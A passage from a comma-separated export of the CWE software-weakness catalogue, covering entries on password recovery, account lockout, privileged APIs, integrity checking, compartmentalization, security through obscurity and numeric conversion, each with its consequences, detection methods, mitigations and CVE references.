resources in a multi-user context.::\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:Access control checks for specific user data or functionality can be bypassed.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Horizontal escalation of privilege is possible (one user can view/modify information of another user).::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.::PHASE:Architecture and Design Implementation:DESCRIPTION:Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.::PHASE:Architecture and Design:DESCRIPTION:Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.::\",\"::REFERENCE:CVE-2021-36539:DESCRIPTION:An educational application does not appropriately restrict file IDs to a particular user. The attacker can brute-force guess IDs, indicating IDOR.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-36539::\",,,\"\",,\"\",\n640,\"Weak Password Recovery Mechanism for Forgotten Password\",Base,Incomplete,\"The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.\",\"It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme. This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials.::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users.::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:The system's security functionality is turned against the system by the attacker.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.::PHASE:Architecture and Design:DESCRIPTION:Do not use standard weak security questions and use several security questions.::PHASE:Architecture and Design:DESCRIPTION:Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.::PHASE:Architecture and Design:DESCRIPTION:Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.::PHASE:Architecture and Design:DESCRIPTION:Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.::PHASE:Architecture and Design:DESCRIPTION:Assign a new temporary password rather than revealing the original password.::\",\"\",,,\"::TAXONOMY NAME:WASC:ENTRY ID:49:ENTRY NAME:Insufficient Password Recovery::\",::50::,\"::TYPE:Maintenance:NOTE:This entry might be reclassified as a category or loose composite, since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password).::TYPE:Maintenance:NOTE:This entry probably needs to be split; see extended description.::\",\n641,\"Improper Restriction of Names for Files and Other Resources\",Base,Incomplete,\"The product constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.\",\"This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.\",::NATURE:ChildOf:CWE ID:99:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Execution of arbitrary code in the context of usage of the resources with dangerous names.::SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Read Application Data:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Crash of the consumer code of these resources resulting in information leakage or denial of service.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Do not allow users to control names of resources used on the server side.::PHASE:Architecture and Design:DESCRIPTION:Perform allowlist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them.::PHASE:Architecture and Design:DESCRIPTION:Make sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n645,\"Overly Restrictive Account Lockout Mechanism\",Base,Incomplete,\"The product contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.\",\"Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.\",::NATURE:ChildOf:CWE ID:287:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:Users could be locked out of accounts.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Implement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.::PHASE:Architecture and Design:DESCRIPTION:Implement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout.::PHASE:Architecture and Design:DESCRIPTION:Consider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation).::\",\"\",,,\"\",::2::,\"\",\n648,\"Incorrect Use of Privileged APIs\",Base,Incomplete,\"The product does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.\",\"When a product contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to: ensure that assumptions made by the APIs are valid, such as validity of arguments account for known weaknesses in the design/implementation of the API call the API from a safe context If the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data. For instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker may be able to elevate privileges.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:An attacker may be able to obtain sensitive information.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:An attacker may be able to execute code.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Before calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call.::PHASE:Architecture and Design:DESCRIPTION:Know architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely.::PHASE:Implementation:DESCRIPTION:If privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call.::PHASE:Implementation:DESCRIPTION:If privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes.::PHASE:Implementation:DESCRIPTION:Only call privileged APIs from safe, consistent and expected state.::PHASE:Implementation:DESCRIPTION:Ensure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges).::\",\"::REFERENCE:CVE-2003-0645:DESCRIPTION:A Unix utility that displays online help files, if installed setuid, could allow a local attacker to gain privileges when a particular file-opening function is called.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0645::\",,,\"\",::107::234::,\"\",\n649,\"Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\",Base,Incomplete,\"The product uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the product does not use integrity checks to detect if those inputs have been modified.\",\"When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State:NOTE:The inputs could be modified without detection, causing the product to have unexpected system state or make incorrect security decisions.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Protect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side.::PHASE:Architecture and Design:DESCRIPTION:Repeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout.::PHASE:Architecture and Design:DESCRIPTION:Client side tokens/parameters should not be such that it would be easy/predictable to guess another valid state.::PHASE:Architecture and Design:DESCRIPTION:Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service.::\",\"::REFERENCE:CVE-2005-0039:DESCRIPTION:An IPSec configuration does not perform integrity checking of the IPSec packet as the result of either not configuring ESP properly to support the integrity service or using AH improperly. In either case, the security gateway receiving the IPSec packet would not validate the integrity of the packet to ensure that it was not changed. Thus if the packets were intercepted the attacker could undetectably change some of the bits in the packets. The meaningful bit flipping was possible due to the known weaknesses in the CBC encryption mode. Since the attacker knew the structure of the packet, they were able (in one variation of the attack) to use bit flipping to change the destination IP of the packet to the destination machine controlled by the attacker. And so the destination security gateway would decrypt the packet and then forward the plaintext to the machine controlled by the attacker. The attacker could then read the original message. For instance if VPN was used with the vulnerable IPSec configuration the attacker could read the victim's e-mail. This vulnerability demonstrates the need to enforce the integrity service properly when critical data could be modified by an attacker. This problem might have also been mitigated by using an encryption mode that is not susceptible to bit flipping attacks, but the preferred mechanism to address this problem still remains message verification for integrity. While this attack focuses on the network layer and requires an entity that controls part of the communication path such as a router, the situation is not much different at the software level, where an attacker can modify tokens/parameters used by the application.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0039::\",,,\"\",::463::,\"\",\n653,\"Improper Isolation or Compartmentalization\",Class,Draft,\"The product does not properly compartmentalize or isolate functionality, processes, or resources that require different privilege levels, rights, or permissions.\",\"When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.\",::NATURE:ChildOf:CWE ID:657:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:693:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Separation of Privilege:DESCRIPTION:Some people and publications use the term Separation of Privilege to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of Separation of Privilege by Saltzer and Schroeder; that original definition is more closely associated with CWE-654. Because there are multiple interpretations, use of the Separation of Privilege term is discouraged.::\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:NOTE:The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Compare binary / bytecode to application permission manifest:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Break up privileges between different modules, objects, or entities. Minimize the interfaces between modules and require strong access control between them.::\",\"::REFERENCE:CVE-2021-33096:DESCRIPTION:Improper isolation of shared resource in a network-on-chip leads to denial of service:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33096::REFERENCE:CVE-2019-6260:DESCRIPTION:Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].:LINK:https://www.cve.org/CVERecord?id=CVE-2019-6260::\",,,\"\",,\"::TYPE:Relationship:NOTE:There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each privilege; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges.::TYPE:Terminology:NOTE:The term Separation of Privilege is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion.::\",\n654,\"Reliance on a Single Factor in a Security Decision\",Base,Draft,\"A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.\",\"\",::NATURE:ChildOf:CWE ID:657:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:693:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Separation of Privilege:DESCRIPTION:Some people and publications use the term Separation of Privilege to describe this weakness, but this term has dual meanings in current usage. While this entry is closely associated with the original definition of Separation of Privilege by Saltzer and Schroeder, others use the same term to describe poor compartmentalization (CWE-653). Because there are multiple interpretations, use of the Separation of Privilege term is discouraged.::\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:If the single factor is compromised (e.g. by theft or spoofing), then the integrity of the entire security mechanism can be violated with respect to the user that is identified by that factor.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:It can become difficult or impossible for the product to be able to distinguish between legitimate activities by the entity who provided the factor, versus illegitimate activities by an attacker.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security).::PHASE:Architecture and Design:DESCRIPTION:Use redundant access rules on different choke points (e.g., firewalls).::\",\"::REFERENCE:CVE-2022-35248:DESCRIPTION:Chat application skips validation when Central Authentication Service (CAS) is enabled, effectively removing the second factor from two-factor authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2022-35248::\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-4::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-1::\",::16::274::49::55::560::565::600::652::653::70::,\"::TYPE:Maintenance:NOTE:This entry is closely associated with the term Separation of Privilege. This term is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (CWE-653) and using only one factor in a security decision (this entry). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion.::\",\n656,\"Reliance on Security Through Obscurity\",Class,Draft,\"The product uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.\",\"This reliance on security through obscurity can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.\",::NATURE:ChildOf:CWE ID:657:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:693:VIEW ID:1000::NATURE:CanPrecede:CWE ID:259:VIEW ID:1000::NATURE:CanPrecede:CWE ID:321:VIEW ID:1000::NATURE:CanPrecede:CWE ID:472:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Never Assuming your secrets are safe::\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Other:NOTE:The security mechanism can be bypassed easily.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others.::PHASE:Architecture and Design:DESCRIPTION:When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication.::\",\"::REFERENCE:CVE-2006-6588:DESCRIPTION:Reliance on hidden form fields in a web application. Many web application vulnerabilities exist because the developer did not consider that hidden form fields can be processed using a modified client.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6588::REFERENCE:CVE-2006-7142:DESCRIPTION:Hard-coded cryptographic key stored in executable program.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-7142::REFERENCE:CVE-2005-4002:DESCRIPTION:Hard-coded cryptographic key stored in executable program.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4002::REFERENCE:CVE-2006-4068:DESCRIPTION:Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4068::\",,,\"\",,\"::TYPE:Relationship:NOTE:Note that there is a close relationship between this weakness and CWE-603 (Use of Client-Side Authentication). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe.::\",\n663,\"Use of a Non-reentrant Function in a Concurrent Context\",Base,Draft,\"The product calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.\",\"\",::NATURE:ChildOf:CWE ID:662:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Modify Application Data:IMPACT:Read Application Data:IMPACT:Alter Execution Logic::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Use reentrant functions if available.::PHASE:Implementation:DESCRIPTION:Add synchronization to your non-reentrant function.::PHASE:Implementation:DESCRIPTION:In Java, use the ReentrantLock Class.::\",\"::REFERENCE:CVE-2001-1349:DESCRIPTION:unsafe calls to library functions from signal handler:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1349::REFERENCE:CVE-2004-2259:DESCRIPTION:SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2259::\",,,\"\",::29::,\"\",\n676,\"Use of Potentially Dangerous Function\",Base,Draft,\"The product invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.\",\"\",::NATURE:ChildOf:CWE ID:1177:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Indirect::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:IMPACT:Quality Degradation:IMPACT:Unexpected State:NOTE:If the function is used incorrectly, then it could result in security problems.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis Cost effective for partial coverage: Binary / Bytecode Quality Analysis Binary / Bytecode simple extractor - strings, ELF readers, etc.:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Debugger Cost effective for partial coverage: Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer Cost effective for partial coverage: Warning Flags Source Code Quality Analyzer:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Origin Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Build and Compilation Implementation:DESCRIPTION:Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the banned.h include file from Microsoft's SDL. [REF-554] [REF-7]::\",\"::REFERENCE:CVE-2007-1470:DESCRIPTION:Library has multiple buffer overflows using sprintf() and strcpy():LINK:https://www.cve.org/CVERecord?id=CVE-2007-1470::REFERENCE:CVE-2009-3849:DESCRIPTION:Buffer overflow using strcat():LINK:https://www.cve.org/CVERecord?id=CVE-2009-3849::REFERENCE:CVE-2006-2114:DESCRIPTION:Buffer overflow using strcpy():LINK:https://www.cve.org/CVERecord?id=CVE-2006-2114::REFERENCE:CVE-2006-0963:DESCRIPTION:Buffer overflow using strcpy():LINK:https://www.cve.org/CVERecord?id=CVE-2006-0963::REFERENCE:CVE-2011-0712:DESCRIPTION:Vulnerable use of strcpy() changed to use safer strlcpy():LINK:https://www.cve.org/CVERecord?id=CVE-2011-0712::REFERENCE:CVE-2008-5005:DESCRIPTION:Buffer overflow using strcpy():LINK:https://www.cve.org/CVERecord?id=CVE-2008-5005::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Dangerous Functions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:CON33-C:ENTRY NAME:Avoid race conditions when using library functions:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR07-C:ENTRY NAME:Prefer functions that support error checking over equivalent functions that don't::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR34-C:ENTRY NAME:Detect errors when converting a string to a number:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO01-C:ENTRY NAME:Be careful using functions that use file names for identification::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MSC30-C:ENTRY NAME:Do not use the rand() function for generating pseudorandom numbers:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR31-C:ENTRY NAME:Guarantee that storage for strings has sufficient space for character data and the null terminator:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"::TYPE:Relationship:NOTE:This weakness is different than CWE-242 (Use of Inherently Dangerous Function). CWE-242 covers functions with such significant security problems that they can never be guaranteed to be safe. Some functions, if used properly, do not directly pose a security risk, but can introduce a weakness if not called correctly. These are regarded as potentially dangerous. A well-known example is the strcpy() function. When provided with a destination buffer that is larger than its source, strcpy() will not overflow. However, it is so often misused that some developers prohibit strcpy() entirely.::\",\n681,\"Incorrect Conversion between Numeric Types\",Base,Draft,\"When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.\",\"\",::NATURE:ChildOf:CWE ID:704:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:704:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:682:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:SCOPE:Integrity:IMPACT:Unexpected State:IMPACT:Quality Degradation:NOTE:The program could wind up using the wrong number and generate incorrect results. If the number is used to allocate resources or make a security decision, then this could introduce a vulnerability.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Avoid making conversion between numeric types. Always check for the allowed ranges.::\",\"::REFERENCE:CVE-2022-2639:DESCRIPTION:Chain: integer coercion error (CWE-192) prevents a return value from indicating an error, leading to out-of-bounds write (CWE-787):LINK:https://www.cve.org/CVERecord?id=CVE-2022-2639::REFERENCE:CVE-2021-43537:DESCRIPTION:Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122):LINK:https://www.cve.org/CVERecord?id=CVE-2021-43537::REFERENCE:CVE-2007-4268:DESCRIPTION:Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4268::REFERENCE:CVE-2007-4988:DESCRIPTION:Chain: signed short width value in image processor is sign extended during conversion to unsigned int, which leads to integer overflow and heap-based buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4988::REFERENCE:CVE-2009-0231:DESCRIPTION:Integer truncation of length value leads to heap-based buffer 